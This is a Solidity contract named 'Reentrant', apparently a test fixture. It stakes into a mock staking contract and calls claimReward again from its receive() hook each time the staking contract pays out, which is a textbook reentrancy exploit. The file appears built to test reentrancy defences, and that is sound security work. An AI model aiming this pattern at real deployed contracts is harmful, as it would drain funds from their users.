// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../interfaces/IMockToken.sol";

interface IMockStaking {
    function claimReward() external;
    function stake(uint256 amount) external;
    function withdraw(uint256 _amount) external;
    function getRewards() external view returns (uint256);
}

contract Reentrant {
    IMockStaking public immutable mockStaking;
    address public immutable mockStakingAddress;
    
    IMockToken public immutable mockToken;
    address public immutable mockTokenAddress;

    constructor(address _mockStakingAddress, address _mockTokenAddress) {
        mockStakingAddress = _mockStakingAddress;
        mockStaking = IMockStaking(mockStakingAddress);

        mockTokenAddress = _mockTokenAddress;
        mockToken = IMockToken(mockTokenAddress);
    }

    function approve() public {
        mockToken.approve(mockStakingAddress, mockToken.getMaxSupply());
    }

    function stake(uint256 amount) public {
        mockStaking.stake(amount);
    }

    function withdraw(uint256 amount) public {
        mockStaking.withdraw(amount);
    }

    function getRewards() public view returns (uint256) {
        return mockStaking.getRewards();
    }

    function attack() public {
        mockStaking.claimReward();
    }

    receive() external payable {
        if(msg.sender == mockStakingAddress) {
            mockStaking.claimReward();
        }
    }
}